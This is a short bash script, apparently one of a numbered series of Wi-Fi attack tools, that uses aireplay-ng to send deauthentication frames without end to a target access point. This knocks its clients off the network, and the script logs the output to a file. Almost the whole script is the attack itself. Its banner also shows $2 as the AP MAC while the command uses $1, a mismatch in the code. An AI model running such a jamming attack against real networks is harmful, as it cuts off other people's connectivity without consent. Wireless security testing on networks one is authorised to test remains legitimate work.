#!/bin/bash
##############################################################
#
#       04-JammingAP.sh - Deauth a client from AP
#
#           AUTHOR: Z1GN1F3R =D
#
#           DATE: 01-27-2021
#   
#           DESCRIPTION: 
#
#
##############################################################

#$MACTARGET=$1

#Welcome
    clear
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "    LEAVE ME HERE"
    echo ""
    echo ""
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "-----> INFORMATION OF ATTACK"
    echo ""
    echo "DEAUTH: INFINITE times"
    echo "AP MAC: $2"
    echo ""
    echo "-----------------------------"
    
#Disconnecting client

    aireplay-ng --deauth 0 -a $1 mon0 | tee log04-JammingAP.txt
    
#Show the results
    echo ""
    echo ""
    echo ""
    echo "--- RESULTS ---"
    ls -1 log04-JammingAP*
    echo "--- END ---"
